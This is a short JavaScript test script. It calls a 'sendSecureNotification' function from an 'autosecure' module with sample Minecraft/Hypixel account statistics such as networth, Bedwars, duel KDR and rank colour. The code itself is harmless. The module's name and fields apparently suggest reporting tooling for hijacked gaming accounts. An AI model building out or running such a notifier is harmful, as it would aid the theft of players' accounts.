const { sendSecureNotification } = require('./autosecure/utils/notifications/notifier.js');

(async () => {
    try {
        console.log("Testing notification system...");
        await sendSecureNotification(null, {
            username: 'TestUser',
            networth: '10M',
            bedwars: '500',
            networkLevel: '120',
            sbLevel: '200',
            duelKDR: '2.5',
            duelWinstreak: '10',
            plusColour: 'RED',
            gifted: '5'
        });
        console.log("Done!");
    } catch (e) {
        console.error(e);
    }
})();
